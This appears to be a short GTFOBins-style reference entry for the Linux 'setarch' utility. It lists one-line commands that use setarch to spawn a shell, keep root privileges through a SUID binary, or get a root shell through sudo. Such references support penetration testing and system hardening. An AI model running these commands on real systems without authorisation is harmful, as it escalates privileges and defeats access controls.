---
description: The `uname -m` command can be used in place of `arch` to obtain the architecture.
functions:
  shell:
    - code: setarch $(arch) /bin/sh
  suid:
    - code: ./setarch $(arch) /bin/sh -p
  sudo:
    - code: sudo setarch $(arch) /bin/sh
---
